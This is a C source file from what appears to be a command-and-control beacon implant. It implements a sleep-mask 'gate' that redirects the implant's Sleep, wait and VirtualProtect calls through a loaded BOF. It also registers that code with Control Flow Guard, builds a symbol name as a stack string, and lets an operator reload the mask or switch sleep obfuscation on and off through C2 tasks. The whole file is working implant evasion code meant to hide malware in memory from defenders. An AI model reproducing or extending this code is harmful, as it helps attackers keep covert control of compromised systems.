/* beacon/src/Commands/Sleepmask.c
 * BeaconGate: gate wrappers, init (embedded BOF), runtime reload.
 * All gate wrappers MUST be in the same TU as the code that takes their
 * address - cross-TU references go through .refptr (GOT-like)
 * which is lost when we extract .text for PIC. */

#include "Nax.h"
#include "Config.h"
#include "Bof.h"
#include "Gate.h"

typedef VOID (*FN_SM_ENTRY)( PVOID, PFUNCTION_CALL );

/* ========= [ helpers ] ========= */

FUNC static UINT32 NaxCountRunningJobs( PNAX_INSTANCE Nax ) {
    UINT32 count = 0;
    NAX_JOB* job = Nax->JobHead;
    while ( job ) {
        if ( job->State == NAX_JOB_RUNNING || job->State == NAX_JOB_ABANDONED )
            count++;
        job = job->Next;
    }
    return count;
}

/* ========= [ gate wrappers ] ========= */

#ifdef NAX_GATE_SLEEP
FUNC VOID WINAPI NaxGateSleep( DWORD dwMilliseconds ) {
    G_INSTANCE;

    NaxDbg( Nax, "[gate] Sleep(%lu ms)", (UINT32)dwMilliseconds );

    Nax->SmInfo.ActiveJobCount = NaxCountRunningJobs( Nax );

    FUNCTION_CALL fc;
    MmZero( &fc, sizeof( fc ) );
    fc.SmInfo = &Nax->SmInfo;

    fc.FunctionPtr = Nax->GateOriginals.Sleep;
    fc.GateApi     = GATE_API_SLEEP;
    fc.NumArgs     = 1;
    fc.Args[0]     = (ULONG_PTR)dwMilliseconds;

    ((FN_SM_ENTRY)Nax->Gate)( Nax, &fc );
}
#endif

#ifdef NAX_GATE_WAITFORSINGLEOBJECT
FUNC DWORD WINAPI NaxGateWaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds ) {
    G_INSTANCE;

    NaxDbg( Nax, "[gate] WaitForSingleObject(handle=%p wait=%lu ms)", hHandle, (UINT32)dwMilliseconds );

    Nax->SmInfo.ActiveJobCount = NaxCountRunningJobs( Nax );

    FUNCTION_CALL fc;
    MmZero( &fc, sizeof( fc ) );
    fc.SmInfo = &Nax->SmInfo;

    fc.FunctionPtr = Nax->GateOriginals.WaitForSingleObject;
    fc.GateApi     = GATE_API_WAIT_FOR_SINGLE_OBJECT;
    fc.NumArgs     = 2;
    fc.Args[0]     = (ULONG_PTR)hHandle;
    fc.Args[1]     = (ULONG_PTR)dwMilliseconds;

    ((FN_SM_ENTRY)Nax->Gate)( Nax, &fc );

    return (DWORD)fc.RetValue;
}
#endif

#ifdef NAX_GATE_WAITFORMULTIPLEOBJECTS
FUNC DWORD WINAPI NaxGateWaitForMultipleObjects( DWORD nCount, const HANDLE* lpHandles, BOOL bWaitAll, DWORD dwMilliseconds ) {
    G_INSTANCE;

    NaxDbg( Nax, "[gate] WaitForMultipleObjects(n=%lu wait=%lu ms)", (UINT32)nCount, (UINT32)dwMilliseconds );

    Nax->SmInfo.ActiveJobCount = NaxCountRunningJobs( Nax );

    FUNCTION_CALL fc;
    MmZero( &fc, sizeof( fc ) );
    fc.SmInfo = &Nax->SmInfo;

    fc.FunctionPtr = Nax->GateOriginals.WaitForMultipleObjects;
    fc.GateApi     = GATE_API_WAIT_FOR_MULTIPLE_OBJECTS;
    fc.NumArgs     = 4;
    fc.Args[0]     = (ULONG_PTR)nCount;
    fc.Args[1]     = (ULONG_PTR)lpHandles;
    fc.Args[2]     = (ULONG_PTR)bWaitAll;
    fc.Args[3]     = (ULONG_PTR)dwMilliseconds;

    ((FN_SM_ENTRY)Nax->Gate)( Nax, &fc );

    return (DWORD)fc.RetValue;
}
#endif

#ifdef NAX_GATE_VIRTUALPROTECT
FUNC BOOL WINAPI NaxGateVirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ) {
    G_INSTANCE;

    NaxDbg( Nax, "[gate] VirtualProtect(addr=%p size=%zu)", lpAddress, dwSize );
    FUNCTION_CALL fc;
    MmZero( &fc, sizeof( fc ) );
    fc.SmInfo = &Nax->SmInfo;

    fc.FunctionPtr = Nax->GateOriginals.VirtualProtect;
    fc.GateApi     = GATE_API_VIRTUAL_PROTECT;
    fc.NumArgs     = 4;
    fc.Args[0]     = (ULONG_PTR)lpAddress;
    fc.Args[1]     = (ULONG_PTR)dwSize;
    fc.Args[2]     = (ULONG_PTR)flNewProtect;
    fc.Args[3]     = (ULONG_PTR)lpflOldProtect;

    ((FN_SM_ENTRY)Nax->Gate)( Nax, &fc );

    return (BOOL)fc.RetValue;
}
#endif

/* ========= [ gate swap table ] ========= */

FUNC static VOID NaxGateRegister( PNAX_INSTANCE Nax, PVOID* slot, PVOID gateFunc ) {
    if ( Nax->GateSwaps.Count >= NAX_GATE_MAX_SWAPS ) return;
    NAX_GATE_SWAP* e = &Nax->GateSwaps.Entries[Nax->GateSwaps.Count++];
    e->Slot     = slot;
    e->Original = *slot;
    *slot = gateFunc;
}

FUNC VOID NaxGateUnwireAll( PNAX_INSTANCE Nax ) {
    for ( UINT32 i = 0; i < Nax->GateSwaps.Count; i++ )
        *Nax->GateSwaps.Entries[i].Slot = Nax->GateSwaps.Entries[i].Original;
    Nax->GateSwaps.Count = 0;
    Nax->Gate = NULL;
}

/* ========= [ shared: load BOF + wire gate ] ========= */

FUNC INT NaxSleepmaskWire( PNAX_INSTANCE Nax, PBYTE coff, UINT32 coff_size ) {
    CHAR sym[] = { 's','l','e','e','p','_','m','a','s','k','\0' };
    PVOID entry = NaxBofLoadResident( Nax, coff, coff_size, sym );
    if ( !entry ) {
        NaxDbg( Nax, "[sleepmask] load failed" );
        return NAX_ERR_FAIL;
    }

    Nax->Gate = entry;
    Nax->GateSwaps.Count = 0;

    if ( Nax->Ntdll.NtQueryVirtualMemory ) {
        MEMORY_BASIC_INFORMATION sm_mbi;
        MmZero( &sm_mbi, sizeof( sm_mbi ) );
        if ( Nax->Ntdll.NtQueryVirtualMemory( NtCurrentProcess(), entry, 0, &sm_mbi, sizeof( sm_mbi ), NULL ) == 0 ) {
            Nax->SmInfo.SmBase = sm_mbi.AllocationBase;
            Nax->SmInfo.SmSize = (UINT32)sm_mbi.RegionSize;
            NaxDbg( Nax, "[sleepmask] sm region: base=%p size=0x%x", Nax->SmInfo.SmBase, Nax->SmInfo.SmSize );
        }
    }

    if ( Nax->CfgEnabled && Nax->BofStompPool.SmSlot.DllBase )
        NaxCfgAddTarget( Nax, Nax->BofStompPool.SmSlot.DllBase, entry );

#ifdef NAX_GATE_SLEEP
    if ( !Nax->GateOriginals.Sleep )
        Nax->GateOriginals.Sleep = (PVOID)Nax->Kernel32.Sleep;
    NaxGateRegister( Nax, (PVOID*)&Nax->Kernel32.Sleep, (PVOID)NaxGateSleep );
    NaxDbg( Nax, "[sleepmask] gated: Sleep (real=%p)", Nax->GateOriginals.Sleep );
#endif

#ifdef NAX_GATE_WAITFORSINGLEOBJECT
    if ( !Nax->GateOriginals.WaitForSingleObject )
        Nax->GateOriginals.WaitForSingleObject = (PVOID)Nax->Kernel32.WaitForSingleObject;
    NaxGateRegister( Nax, (PVOID*)&Nax->Kernel32.WaitForSingleObject, (PVOID)NaxGateWaitForSingleObject );
    NaxDbg( Nax, "[sleepmask] gated: WaitForSingleObject (real=%p)", Nax->GateOriginals.WaitForSingleObject );
#endif

#ifdef NAX_GATE_WAITFORMULTIPLEOBJECTS
    if ( !Nax->GateOriginals.WaitForMultipleObjects )
        Nax->GateOriginals.WaitForMultipleObjects = (PVOID)Nax->Kernel32.WaitForMultipleObjects;
    NaxGateRegister( Nax, (PVOID*)&Nax->Kernel32.WaitForMultipleObjects, (PVOID)NaxGateWaitForMultipleObjects );
    NaxDbg( Nax, "[sleepmask] gated: WaitForMultipleObjects (real=%p)", Nax->GateOriginals.WaitForMultipleObjects );
#endif

#ifdef NAX_GATE_VIRTUALPROTECT
    if ( !Nax->GateOriginals.VirtualProtect )
        Nax->GateOriginals.VirtualProtect = (PVOID)Nax->Kernel32.VirtualProtect;
    NaxGateRegister( Nax, (PVOID*)&Nax->Kernel32.VirtualProtect, (PVOID)NaxGateVirtualProtect );
    NaxDbg( Nax, "[sleepmask] gated: VirtualProtect (real=%p)", Nax->GateOriginals.VirtualProtect );
#endif

    NaxDbg( Nax, "[sleepmask] wired: gate=%p", entry );
    return NAX_OK;
}

/* ========= [ NaxSleepmaskInit - load embedded BOF at startup ] ========= */

FUNC INT NaxSleepmaskInit( PNAX_INSTANCE Nax ) {
#ifdef NAX_SLEEPMASK_LEN
    NaxDbg( Nax, "[sleepmask] init: embedding %u bytes", (UINT32)NAX_SLEEPMASK_LEN );

    PBYTE buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, NAX_SLEEPMASK_LEN );
    if ( !buf ) {
        NaxDbg( Nax, "[sleepmask] init: alloc failed" );
        return NAX_ERR_FAIL;
    }

    NAX_SLEEPMASK_WRITE( buf );

    /* Persist a copy so runtime SmSlot DLL changes can re-wire */
    Nax->SmBofCache = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, NAX_SLEEPMASK_LEN );
    if ( Nax->SmBofCache ) {
        MmCopy( Nax->SmBofCache, buf, NAX_SLEEPMASK_LEN );
        Nax->SmBofCacheLen = NAX_SLEEPMASK_LEN;
    }

    INT rc = NaxSleepmaskWire( Nax, buf, NAX_SLEEPMASK_LEN );

    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, buf );
    return rc;
#else
    return NAX_OK;
#endif
}

/* ========= [ CMD_SLEEPMASK_SET - runtime reload via task ] ========= */

FUNC INT NaxCmdSleepmaskSet( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    *out_len = 0;

    if ( args_len < 4 )
        return NAX_ERR_WIRE;

    UINT32 coff_size = NaxR32( args );
    if ( coff_size == 0 || coff_size > args_len - 4 )
        return NAX_ERR_WIRE;

    PBYTE coff = args + 4;

    /* Update cache so SmSlot DLL changes can re-wire later */
    if ( Nax->SmBofCache )
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, Nax->SmBofCache );
    Nax->SmBofCache = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, coff_size );
    if ( Nax->SmBofCache ) {
        MmCopy( Nax->SmBofCache, coff, coff_size );
        Nax->SmBofCacheLen = coff_size;
    }

    return NaxSleepmaskWire( Nax, coff, coff_size );
}

/* ========= [ CMD_SLEEPOBF_CONFIG - runtime sleep obfuscation toggle ] ========= */

FUNC INT NaxCmdSleepObfConfig( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 2 )
        return NAX_ERR_WIRE;

    Nax->SmInfo.Config.SleepObf = args[0];

    NaxDbg( Nax, "[sleepobf] config: sleep_obf=%u", Nax->SmInfo.Config.SleepObf );

    out[0] = Nax->SmInfo.Config.SleepObf;
    out[1] = 0;
    *out_len = 2;

    return NAX_OK;
}
